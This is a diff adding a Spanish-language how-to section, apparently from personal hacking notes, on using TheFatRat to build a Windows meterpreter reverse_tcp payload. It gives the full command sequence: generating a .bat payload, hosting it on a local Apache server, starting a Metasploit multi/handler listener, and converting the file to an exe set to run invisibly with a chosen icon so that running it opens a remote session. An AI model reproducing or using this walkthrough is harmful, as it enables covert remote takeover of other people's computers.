@@ -393,6 +393,56 @@ rmdir <nombre directorio> (Borrar directorio)
 --- sysinfo (Muestra información del sistema)
 --- Nota: este método sólo trabaja windows sin antivirus activo
 
+++ FatRat
+--- URL: https://github.com/StreetSec/FatRat
+--- Navegar al directorio del programa
+--- ls
+--- chmod +x setup.sh
+--- ./setup.sh
+--- y
+--- fatrat
+--- Seleccionar la opción 1 (create a bat file)
+--- Indicar nuestra ip local 
+--- Indicar el puerto: 8080
+--- Indicar el nombre del ejecutable
+--- Seleccionar la opcion 3 (Windows meterpreter/reverse_tcp
+--- cd TheFatRat/output
+--- ls
+--- El archivo generado debe estar listado
+--- cp <nombre_archivo> /var/www/html (Ubicación del servidor apache)
+--- msfconsole
+--- use exploit/multi/handler
+--- set payload windows/meterpreter/reverse_tcp
+--- set LHOST <ip_local>
+--- set LPORT <8080>
+--- run
+--- Ir a la computadora con windows
+--- Colocar en el navegador la ip del kali
+--- Descargar el archivo
+--- Con el programa advance bat to exe converter proceder a convertir el bat a exe
+--- URL del programa: https://www.battoexeconverter.com/
+--- Ir a la sección file ---> open
+--- Seleccionar el archivo
+--- Ir a la sección file ---> Build EXE
+--- Seleccionar la opción Start_Invisible (NO_CONSOLE window)
+--- Seleccionar el icono
+--- Seleccionar la opción BUILD EXE
+--- Nombrar el archivo y seleccionar la ubicación
+--- Ejecutar el programa
+--- Volver al kali
+--- Se nos mostrará un mensaje que indica que una sesión ha sido abierta
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
